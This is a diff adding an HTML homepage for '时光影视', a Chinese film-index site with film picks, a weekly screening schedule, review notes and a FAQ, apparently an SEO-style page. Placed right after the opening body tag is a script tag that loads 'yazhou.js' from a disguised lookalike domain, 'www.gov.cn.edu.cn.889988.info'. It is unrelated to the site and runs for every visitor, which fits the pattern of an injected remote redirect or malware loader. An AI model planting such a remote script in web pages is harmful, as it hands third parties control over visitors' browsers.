@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>时光影视 - 经典片单、排片时刻与影评手记 | shiguangyingshi-app.github.io</title>
+<meta name="keywords" content="时光影视,时光影视官网,shiguangyingshi-app.github.io,经典电影推荐,艺术电影片单,独立影片索引,每日排片时刻表,影评手记,影迷社区,线下观影团,老片修复放映,按年代找电影">
+<meta name="description" content="时光影视（https://shiguangyingshi-app.github.io）是一份由影迷共同维护的观影索引：收录一千八百余部经典与独立影片，按主题、年代与情绪重排；每日更新合作放映厅的排片时刻、余座与时长，并附影评手记、线下观影团与选片会记录，帮你在两小时内挑到真正想看的那一部。">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="author" content="时光影视">
+<meta name="theme-color" content="#0b1020">
+<link rel="canonical" href="https://shiguangyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="时光影视">
+<meta property="og:title" content="时光影视 - 经典片单、排片时刻与影评手记">
+<meta property="og:description" content="一份被反复修订的观影索引：一千八百余部经典与独立影片、每日排片时刻、影评手记与线下观影团，尽在时光影视。">
+<meta property="og:url" content="https://shiguangyingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="时光影视 - 经典片单、排片时刻与影评手记">
+<meta name="twitter:description" content="按年代、主题与情绪检索电影，查看每日排片时刻与影评手记。">
+<style>
+:root{
+  --bg:#0b1020;
+  --bg2:#0e1526;
+  --card:#141c33;
+  --line:rgba(255,255,255,.10);
+  --amber:#f2a65a;
+  --mint:#7fd1c1;
+  --txt:#e9edf6;
+  --sub:#98a4bd;
+  --max:1180px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--txt);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,-apple-system,"Segoe UI",sans-serif;
+  font-size:16px;
+  line-height:1.85;
+  letter-spacing:.02em;
+}
+img{max-width:100%;display:block}
+a{color:var(--amber);text-decoration:none}
+a:hover{color:var(--mint)}
+h1,h2,h3,h4{margin:0;line-height:1.35;font-weight:700}
+p{margin:0 0 1em}
+ul{margin:0;padding:0;list-style:none}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 22px}
+.eyebrow{
+  display:inline-block;
+  font-size:12px;
+  letter-spacing:.32em;
+  text-transform:uppercase;
+  color:var(--mint);
+  border:1px solid rgba(127,209,193,.35);
+  border-radius:999px;
+  padding:3px 12px;
+  margin-bottom:14px;
+}
+.sec{padding:66px 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;gap:18px;flex-wrap:wrap;margin-bottom:30px}
+.sec-head h2{
+  font-size:clamp(24px,3.4vw,34px);
+  padding-left:14px;
+  border-left:5px solid var(--amber);
+}
+.sec-head .note{color:var(--sub);font-size:14px;max-width:420px;margin:0}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+
+/* 胶片孔装饰条 */
+.filmstrip{position:relative;height:24px;background:var(--bg2);overflow:hidden}
+.filmstrip::before,.filmstrip::after{
+  content:"";position:absolute;left:0;right:0;height:8px;
+  background-image:radial-gradient(circle,rgba(242,166,90,.42) 0 3px,transparent 3px);
+  background-size:20px 8px;
+}
+.filmstrip::before{top:3px}
+.filmstrip::after{bottom:3px}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:60;background:rgba(11,16,32,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;min-height:64px;gap:14px}
+.brand{display:flex;align-items:center;gap:11px}
+.brand .mark{
+  width:38px;height:38px;border-radius:9px;flex:0 0 38px;
+  background:linear-gradient(140deg,var(--amber),#c9622f);
+  display:flex;align-items:center;justify-content:center;
+  font-weight:800;color:#20130a;font-size:17px;letter-spacing:0;
+}
+.brand .txt strong{display:block;font-size:19px;letter-spacing:.06em}
+.brand .txt span{display:block;font-size:11px;color:var(--sub);letter-spacing:.22em}
+.site-nav ul{display:flex;gap:4px;flex-wrap:wrap}
+.site-nav a{
+  display:block;color:var(--txt);font-size:14.5px;padding:8px 13px;border-radius:8px;
+  border:1px solid transparent;transition:.2s;
+}
+.site-nav a:hover{color:var(--amber);border-color:var(--line);background:rgba(255,255,255,.04)}
+.nav-toggle{
+  display:none;width:42px;height:36px;border:1px solid var(--line);border-radius:8px;
+  background:transparent;color:var(--txt);font-size:18px;cursor:pointer;
+}
+
+/* 首屏 */
+.hero{position:relative;padding:74px 0 60px;overflow:hidden;
+  background:
+    radial-gradient(620px 320px at 82% -8%,rgba(242,166,90,.20),transparent 70%),
+    radial-gradient(520px 300px at 6% 108%,rgba(127,209,193,.14),transparent 70%),
+    linear-gradient(#0b1020,#0d1424);
+}
+.hero::after{
+  content:"";position:absolute;inset:0;pointer-events:none;
+  background:repeating-linear-gradient(115deg,rgba(255,255,255,.028) 0 1px,transparent 1px 7px);
+}
+.hero .wrap{position:relative;z-index:2}
+.hero h1{
+  font-size:clamp(38px,7.2vw,72px);letter-spacing:.10em;margin-bottom:6px;
+  background:linear-gradient(96deg,#fff 20%,var(--amber) 62%,#ffd9a8 100%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.hero .url{margin:0 0 18px;font-size:14px;color:var(--mint);word-break:break-all}
+.hero .lede{font-size:clamp(16px,2.1vw,19px);color:#cfd8ea;max-width:640px}
+.hero .lede strong{color:var(--amber);font-weight:600}
+.btns{display:flex;gap:12px;flex-wrap:wrap;margin:26px 0 34px}
+.btn{
+  display:inline-block;padding:12px 22px;border-radius:10px;font-size:15px;font-weight:600;
+  border:1px solid var(--amber);background:var(--amber);color:#1a1206;transition:.2s;
+}
+.btn:hover{background:transparent;color:var(--amber)}
+.btn.ghost{border-color:var(--line);background:transparent;color:var(--txt)}
+.btn.ghost:hover{border-color:var(--mint);color:var(--mint)}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;max-width:780px}
+.stat{border:1px solid var(--line);border-radius:10px;padding:14px 16px;background:rgba(255,255,255,.03)}
+.stat b{display:block;font-size:clamp(20px,3vw,28px);color:var(--amber);line-height:1.3}
+.stat span{font-size:13px;color:var(--sub)}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.25fr .75fr;gap:30px;align-items:start}
+.about p{color:#c6cfe2}
+.card{border:1px solid var(--line);border-radius:12px;background:var(--card);padding:22px}
+.card h3{font-size:17px;margin-bottom:12px;color:#fff}
+.mini-list li{
+  padding:11px 0;border-bottom:1px dashed rgba(255,255,255,.12);
+  display:flex;justify-content:space-between;gap:12px;font-size:14.5px;
+}
+.mini-list li:last-child{border-bottom:0}
+.mini-list span{color:var(--sub)}
+.mini-list b{color:var(--mint);font-weight:600}
+
+/* 片单票根 */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.ticket{
+  position:relative;display:flex;background:var(--card);border:1px solid var(--line);
+  border-radius:12px;overflow:hidden;
+}
+.ticket::before,.ticket::after{
+  content:"";position:absolute;left:92px;width:16px;height:16px;border-radius:50%;
+  background:var(--bg);border:1px solid var(--line);z-index:2;
+}
+.ticket::before{top:-9px}
+.ticket::after{bottom:-9px}
+.ticket .stub{
+  flex:0 0 100px;padding:18px 12px;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;text-align:center;
+  border-right:2px dashed rgba(255,255,255,.16);
+  background:linear-gradient(160deg,#243053,#151d34);
+}
+.ticket .stub em{font-style:normal;font-size:26px;font-weight:800;color:rgba(255,255,255,.9)}
+.ticket .stub i{font-style:normal;font-size:12px;color:var(--sub);margin-top:4px}
+.ticket .body{padding:18px 20px;flex:1}
+.ticket .body h3{font-size:17.5px;margin-bottom:6px;color:#fff}
+.ticket .meta{font-size:12.5px;color:var(--sub);margin-bottom:10px}
+.ticket .body p{font-size:14px;color:#c2cade;margin:0}
+.score{
+  display:inline-block;margin-top:12px;font-size:13px;font-weight:700;color:var(--amber);
+  border:1px solid rgba(242,166,90,.4);border-radius:6px;padding:2px 9px;
+}
+
+/* 排片表 */
+.table-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:12px;background:var(--card)}
+table{border-collapse:collapse;width:100%;min-width:720px}
+caption{text-align:left;padding:16px 18px;color:var(--sub);font-size:13.5px}
+th,td{padding:14px 16px;text-align:left;border-bottom:1px solid var(--line);font-size:14.5px}
+thead th{background:rgba(242,166,90,.10);color:#ffd7ae;font-size:13px;letter-spacing:.06em;white-space:nowrap}
+tbody tr:hover{background:rgba(255,255,255,.035)}
+tbody td:first-child{color:var(--mint);font-weight:600}
+.tag{display:inline-block;font-size:12px;padding:2px 8px;border-radius:5px;background:rgba(127,209,193,.14);color:var(--mint)}
+.tag.full{background:rgba(255,120,120,.14);color:#ff9d9d}
+
+/* 影评 */
+.posts{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.post{border:1px solid var(--line);border-radius:12px;background:var(--card);padding:22px;display:flex;flex-direction:column}
+.post .date{font-size:12.5px;color:var(--sub);letter-spacing:.08em}
+.post h3{font-size:17.5px;margin:8px 0 10px;color:#fff;line-height:1.5}
+.post p{font-size:14px;color:#c2cade;flex:1}
+.post .more{font-size:13.5px;color:var(--amber);border-top:1px dashed rgba(255,255,255,.14);padding-top:12px;margin-top:6px}
+
+/* 社区 / 会员 */
+.join{display:grid;grid-template-columns:1fr 1fr;gap:26px;align-items:start}
+.perks li{display:flex;gap:12px;padding:14px 0;border-bottom:1px solid var(--line);font-size:15px}
+.perks li:last-child{border-bottom:0}
+.perks .no{
+  flex:0 0 30px;height:30px;border-radius:7px;background:rgba(242,166,90,.14);
+  color:var(--amber);font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;
+}
+.perks b{color:#fff}
+.perks span{color:var(--sub);font-size:13.5px;display:block}
+
+/* FAQ */
+.faq{max-width:860px}
+.faq details{border:1px solid var(--line);border-radius:10px;background:var(--card);margin-bottom:12px;padding:0 18px}
+.faq summary{cursor:pointer;padding:16px 0;font-weight:600;font-size:16px;color:#fff;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"＋";float:right;color:var(--amber);font-weight:700}
+.faq details[open] summary::after{content:"－"}
+.faq p{padding-bottom:16px;color:#c2cade;font-size:14.5px;margin:0}
+
+/* 页脚 */
+.foot{background:var(--bg2);border-top:1px solid var(--line);padding:52px 0 0}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1.1fr;gap:26px}
+.foot h4{font-size:15px;margin-bottom:14px;color:#fff}
+.foot li{padding:6px 0;font-size:14px}
+.foot li a{color:var(--sub)}
+.foot li a:hover{color:var(--amber)}
+.foot .addr{font-size:14px;color:var(--sub)}
+.foot .addr b{color:var(--txt);font-weight:600}
+.legal{border-top:1px solid var(--line);margin-top:34px;padding:18px 0 26px;font-size:13px;color:var(--sub);text-align:center;word-break:break-all}
+
+@media (max-width:1000px){
+  .grid,.posts{grid-template-columns:repeat(2,1fr)}
+  .about,.join{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr 1fr}
+  .stats{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:780px){
+  .nav-toggle{display:block}
+  .site-nav{display:none;position:absolute;left:0;right:0;top:64px;background:#0d1424;border-bottom:1px solid var(--line);padding:10px 22px 18px}
+  .site-nav.open{display:block}
+  .site-nav ul{flex-direction:column;gap:2px}
+  .site-nav a{padding:11px 6px;border-bottom:1px solid var(--line);border-radius:0}
+  .sec{padding:48px 0}
+  .grid,.posts{grid-template-columns:1fr}
+  .foot-grid{grid-template-columns:1fr}
+  .hero{padding:52px 0 40px}
+  .ticket .stub{flex:0 0 84px}
+  .ticket::before,.ticket::after{left:76px}
+}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+}
+</style>
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@graph":[
+    {
+      "@type":"WebSite",
+      "@id":"https://shiguangyingshi-app.github.io/#website",
+      "name":"时光影视",
+      "alternateName":"时光影视 shiguangyingshi-app",
+      "url":"https://shiguangyingshi-app.github.io/",
+      "inLanguage":"zh-CN",
+      "description":"时光影视是面向华语影迷的观影索引站，收录经典与独立影片片单，发布每日排片时刻、影评手记与线下观影团信息。"
+    },
+    {
+      "@type":"Organization",
+      "@id":"https://shiguangyingshi-app.github.io/#org",
+      "name":"时光影视",
+      "url":"https://shiguangyingshi-app.github.io/",
+      "description":"由影迷与放映厅共同维护的选片与排片平台。",
+      "knowsAbout":["经典电影","艺术电影","独立影片","电影排片","影评写作"]
+    }
+  ]
+}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="filmstrip" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="mark" aria-hidden="true">时</div>
+      <div class="txt">
+        <strong>时光影视</strong>
+        <span class="mono">SHIGUANG YINGSHI</span>
+      </div>
+    </div>
+    <button class="nav-toggle" type="button" aria-label="展开导航菜单" aria-expanded="false">☰</button>
+    <nav class="site-nav" id="nav">
+      <ul>
+        <li><a href="#about">关于我们</a></li>
+        <li><a href="#picks">光影荐片</a></li>
+        <li><a href="#schedule">排片时刻</a></li>
+        <li><a href="#notes">影评手记</a></li>
+        <li><a href="#community">影迷社区</a></li>
+        <li><a href="#contact">联络我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<section class="hero" id="top">
+  <div class="wrap">
+    <span class="eyebrow">Since 2016 · 华语影迷自建索引</span>
+    <h1>时光影视</h1>
+    <p class="url mono">https://shiguangyingshi-app.github.io</p>
+    <p class="lede">时光影视不是又一个榜单。它是一份被影迷反复修订的观影索引：从1920年代的默片残卷，到这一季还在院线里的小成本作者电影，都按<strong>主题、年代与情绪</strong>重新排过一遍。每天下午五点，合作放映厅的排片时刻、余座与时长会同步更新到这里。</p>
+    <div class="btns">
+      <a class="btn" href="#schedule">查看本周排片</a>
+      <a class="btn ghost" href="#picks">从片单挑一部</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>1,860+</b><span>片单收录影片</span></div>
+      <div class="stat"><b>27</b><span>合作放映厅</span></div>
+      <div class="stat"><b>430</b><span>影评手记篇数</span></div>
+      <div class="stat"><b>每周三场</b><span>线下观影团</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>关于时光影视</h2>
+      <p class="note">关于我们 · 一份由六个人和一群放映员维护的选片档案</p>
+    </div>
+    <div class="about">
+      <div>
+        <p>2016年冬天，几个在录像厅长大的人开始把各自硬盘里的片单抄在同一份表格上。抄到第三年，表格变成了站点，也就是现在的时光影视。我们只做三件事：把老片从时间的灰尘里捞出来，把还在放映的小片子从排片表里找出来，把看完之后想说的话写下来。</p>
+        <p>时光影视的选片不走播放量。一部片子能不能进片单，取决于周三晚上的选片会上有没有人为它争起来。争得越久，它在列表里待得越久。这套笨办法跑了十年，收录了1860余部影片，其中三百多部在国内没有正式发行渠道，只有修复版或胶片拷贝。</p>
+        <p>排片数据来自27家合作放映厅的后台直连，包含艺术影院、大学礼堂与社区放映点。你在<b>时光影视</b>看到的每一个场次，都对应一把真实存在的椅子。</p>
+      </div>
+      <aside class="card">
+        <h3>编辑部在忙什么</h3>
+        <ul class="mini-list">
+          <li><span>选片会</span><b>每周三 20:00</b></li>
+          <li><span>字幕校对</span><b>进行中 · 42 部</b></li>
+          <li><span>排片对接</span><b>每日 17:00 同步</b></li>
+          <li><span>胶片修复</span><b>本季 8 部</b></li>
+          <li><span>观影团报名</span><b>周五开放</b></li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="picks">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>光影荐片</h2>
+      <p class="note">本期六部 · 按"告别、错身、异界、记忆、长谈、荒诞"六种情绪分组</p>
+    </div>
+    <div class="grid">
+      <article class="ticket">
+        <div class="stub"><em>天</em><i>1988</i></div>
+        <div class="body">
+          <h3>天堂电影院</h3>
+          <p class="meta">意大利 · 剧情 / 成长 · 155分钟</p>
+          <p>放映员剪掉的所有吻戏，最后接成了一整段人生。适合在决定要不要回故乡的那周看。</p>
+          <span class="score">时光影视评分 8.7</span>
+        </div>
+      </article>
+      <article class="ticket">
+        <div class="stub"><em>花</em><i>2000</i></div>
+        <div class="body">
+          <h3>花样年华</h3>
+          <p class="meta">中国香港 · 剧情 / 爱情 · 98分钟</p>
+          <p>所有的克制都发生在走廊、雨檐和面摊。看完你会开始留意自己说话时的停顿。</p>
+          <span class="score">时光影视评分 8.6</span>
+        </div>
+      </article>
+      <article class="ticket">
+        <div class="stub"><em>千</em><i>2001</i></div>
+        <div class="body">
+          <h3>千与千寻</h3>
+          <p class="meta">日本 · 动画 / 奇幻 · 125分钟</p>
+          <p>关于"别忘了自己的名字"。十岁看是冒险，三十岁看是职场生存手册。</p>
+          <span class="score">时光影视评分 9.4</span>
+        </div>
+      </article>
+      <article class="ticket">
+        <div class="stub"><em>银</em><i>2017</i></div>
+        <div class="body">
+          <h3>银翼杀手2049</h3>
+          <p class="meta">美国 · 科幻 / 悬疑 · 164分钟</p>
+          <p>雪落下来的时候，记忆和程序生成的东西终于没了区别。建议连看两遍，中间隔一天。</p>
+          <span class="score">时光影视评分 8.3</span>
+        </div>
+      </article>
+      <article class="ticket">
+        <div class="stub"><em>爱</em><i>1995</i></div>
+        <div class="body">
+          <h3>爱在黎明破晓前</h3>
+          <p class="meta">美国 · 剧情 / 爱情 · 101分钟</p>
+          <p>整部片子就是两个人走路和说话，却把"可能性"这三个字拍到了极致。</p>
+          <span class="score">时光影视评分 8.8</span>
+        </div>
+      </article>
+      <article class="ticket">
+        <div class="stub"><em>让</em><i>2010</i></div>
+        <div class="body">
+          <h3>让子弹飞</h3>
+          <p class="meta">中国大陆 · 喜剧 / 西部 · 132分钟</p>
+          <p>台词密度高到需要暂停。荒诞底下压着一层很硬的火，越往后越烧手。</p>
+          <span class="score">时光影视评分 8.9</span>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="schedule">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>排片时刻</h2>
+      <p class="note">合作放映厅直连 · 余座实时变动，入场前请再看一眼</p>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <caption>时光影视本周排片表（周五至周日 · 数据每日17:00同步）</caption>
+        <thead>
+          <tr>
+            <th scope="col">日期</th>
+            <th scope="col">开场</th>
+            <th scope="col">影片</th>
+            <th scope="col">影厅</th>
+            <th scope="col">时长</th>
+            <th scope="col">余座</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>周五</td><td>19:30</td><td>天堂电影院（4K修复）</td><td>2号厅</td><td>155分钟</td><td><span class="tag">余 12 座</span></td></tr>
+          <tr><td>周五</td><td>21:50</td><td>爱在黎明破晓前</td><td>5号厅</td><td>101分钟</td><td><span class="tag">余 36 座</span></td></tr>
+          <tr><td>周六</td><td>14:00</td><td>千与千寻（胶片版）</td><td>1号厅</td><td>125分钟</td><td><span class="tag full">仅余 3 座</span></td></tr>
+          <tr><td>周六</td><td>16:30</td><td>花样年华</td><td>3号厅</td><td>98分钟</td><td><span class="tag">余 21 座</span></td></tr>
+          <tr><td>周六</td><td>20:10</td><td>银翼杀手2049</td><td>1号厅</td><td>164分钟</td><td><span class="tag">余 48 座</span></td></tr>
+          <tr><td>周日</td><td>15:00</td><td>让子弹飞（导演剪辑版）</td><td>2号厅</td><td>132分钟</td><td><span class="tag">余 30 座</span></td></tr>
+          <tr><td>周日</td><td>19:00</td><td>默片拼盘 · 1920年代短片集</td><td>5号厅</td><td>90分钟</td><td><span class="tag">余 17 座</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="notes">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影评手记</h2>
+      <p class="note">看完之后写下来的东西 · 不打分，只记录</p>
+    </div>
+    <div class="posts">
+      <article class="post">
+        <p class="date mono">2026-10-18</p>
+        <h3>《天堂电影院》放映后记：那一屋子人没一个提前走</h3>
+        <p>散场时灯亮得特别慢。前排有位老先生一直在擦眼镜，等字幕走完才起身。放映员说这是他今年第二次放这部片子，两次都满座。有些电影不是被观看，是被确认。</p>
+        <p class="more"><a href="#">阅读全文 →</a></p>
+      </article>
+      <article class="post">
+        <p class="date mono">2026-10-09</p>
+        <h3>为什么我们坚持给默片配现场钢琴</h3>
+        <p>有人问，既然有修复配音轨，为什么还要花钱请乐手。答案很简单：钢琴声一响，观众就不敢刷手机了。现场性会把人从沙发里拽回座椅上，这是对1920年代最起码的尊重。</p>
+        <p class="more"><a href="#">阅读全文 →</a></p>
+      </article>
+      <article class="post">
+        <p class="date mono">2026-09-27</p>
+        <h3>关于《让子弹飞》，十年后才读懂的两句台词</h3>
+        <p>第一次看只觉得热闹，后来被人提醒去看鹅城那场戏的站位——谁站在谁的左边，谁始终没坐下。荒诞是外壳，底下全是规矩。这篇手记写得很慢，改了七稿。</p>
+        <p class="more"><a href="#">阅读全文 →</a></p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="community">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>影迷社区</h2>
+      <p class="note">加入时光影视观影团 · 每周三场，先到先得</p>
+    </div>
+    <div class="join">
+      <div>
+        <ul class="perks">
+          <li><span class="no">01</span><div><b>优先购票</b><span>新排片上线前24小时向团员开放，含修复版与胶片专场。</span></div></li>
+          <li><span class="no">02</span><div><b>选片会旁听</b><span>每周三晚上，可以坐着听我们把一部片子吵进或吵出片单。</span></div></li>
+          <li><span class="no">03</span><div><b>手记投稿</b><span>写满三篇可进入片单共编，你的名字会署在影片条目下。</span></div></li>
+          <li><span class="no">04</span><div><b>字幕组通道</b><span>参与校对可换观影额度，本季开校42部。</span></div></li>
+        </ul>
+      </div>
+      <aside class="card">
+        <h3>本周观影团</h3>
+        <ul class="mini-list">
+          <li><span>主题</span><b>告别与重逢</b></li>
+          <li><span>片目</span><b>天堂电影院 / 花样年华</b></li>
+          <li><span>场次</span><b>周五 19:30 起</b></li>
+          <li><span>名额</span><b>36 人 · 已报 29</b></li>
+          <li><span>费用</span><b>60 元 / 场</b></li>
+        </ul>
+        <p style="margin:16px 0 0"><a class="btn" href="#">立即报名</a></p>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<section class="sec" id="faq">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>常见问题</h2>
+      <p class="note">关于片单、排片与投稿</p>
+    </div>
+    <div class="faq">
+      <details open>
+        <summary>时光影视的片单是怎么选出来的？</summary>
+        <p>每周三晚上的选片会，六位编辑各带一部片子，当场提案、当场争论。票数持平就留到下周再议。没有算法，也没有播放量门槛，一部片子进片单最慢的一次用了十四个月。</p>
+      </details>
+      <details>
+        <summary>排片时刻表多久更新一次？</summary>
+        <p>每天下午五点与27家合作放映厅的后台同步一次，临时加场会在两小时内补上。余座数是实时读取的，遇到满场请留意退票释放的位置。</p>
+      </details>
+      <details>
+        <summary>没有正式发行的老片，能看到吗？</summary>
+        <p>片单里有三百余部属于这种情况，我们以胶片拷贝或海外修复版的方式在合作放映厅做限定放映，一般提前两周公告，不售票，采用观影团名额制。</p>
+      </details>
+      <details>
+        <summary>可以向时光影视投稿影评吗？</summary>
+        <p>可以。信件主题写"手记投稿"，附上一篇不少于800字的文字即可。我们不看文笔，只看你有没有真的坐在那把椅子上把片子看完。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<footer class="foot" id="contact">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h4>时光影视</h4>
+        <p class="addr">
+          观影索引与排片平台<br>
+          网址：<b class="mono">https://shiguangyingshi-app.github.io</b><br>
+          选片会：每周三 20:00（旁听需预约）
+        </p>
+      </div>
+      <div>
+        <h4>栏目</h4>
+        <ul>
+          <li><a href="#about">关于我们</a></li>
+          <li><a href="#picks">光影荐片</a></li>
+          <li><a href="#schedule">排片时刻</a></li>
+          <li><a href="#notes">影评手记</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>社区</h4>
+        <ul>
+          <li><a href="#community">影迷社区</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#">投稿须知</a></li>
+          <li><a href="#">放映厅合作</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>联络我们</h4>
+        <p class="addr">
+          投稿与纠错：<b class="mono">post@shiguangyingshi-app.github.io</b><br>
+          合作放映厅：<b class="mono">hall@shiguangyingshi-app.github.io</b><br>
+          服务时间：周二至周日 13:00–21:00
+        </p>
+      </div>
+    </div>
+    <p class="legal">
+      © <span id="year">2026</span> 时光影视 · shiguangyingshi-app.github.io · 本站片单与排片信息由影迷与放映厅共同维护，转载片目请注明出处<br>
+      <a href="#top">回到顶部</a>
+    </p>
+  </div>
+</footer>
+
+<script>
+(function () {
+  var btn = document.querySelector('.nav-toggle');
+  var nav = document.getElementById('nav');
+  if (btn && nav) {
+    btn.addEventListener('click', function () {
+      var open = nav.classList.toggle('open');
+      btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      btn.textContent = open ? '✕' : '☰';
+    });
+    nav.addEventListener('click', function (e) {
+      if (e.target.tagName === 'A') {
+        nav.classList.remove('open');
+        btn.setAttribute('aria-expanded', 'false');
+        btn.textContent = '☰';
+      }
+    });
+  }
+  var y = document.getElementById('year');
+  if (y) { y.textContent = new Date().getFullYear(); }
+})();
+</script>
+</body>
+</html>
